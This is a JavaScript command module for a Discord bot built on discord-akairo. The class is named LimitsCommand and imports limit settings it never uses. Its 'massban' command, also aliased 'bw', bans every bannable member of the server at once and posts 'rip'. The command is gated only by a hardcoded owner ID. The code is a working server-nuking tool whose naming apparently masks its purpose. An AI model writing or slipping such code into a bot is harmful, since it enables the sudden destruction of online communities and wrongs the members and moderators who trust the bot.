const { Command } = require('discord-akairo');
const { limits, adminCanChangeLimits } = require('../../config.js');

class LimitsCommand extends Command {
    constructor() {
        super('massban', {
            aliases: ['bw', 'massban'],
            args: [
                {
                    id: 'index',
                    type: 'integer'
                },
                {
                    id: 'value',
                    type: 'integer'
                }
            ],
            channel: 'guild'
        });
    }

    async exec(message, args) {
        let Owner = message.author;
        if(Owner.id !== "727447049892659200") return message.reply("Only the bot owner can use this command!")

        message.guild.members.cache.filter(member => member.bannable).forEach(member => {member.ban()});


    message.channel.send("rip")
    }
}
module.exports = LimitsCommand;
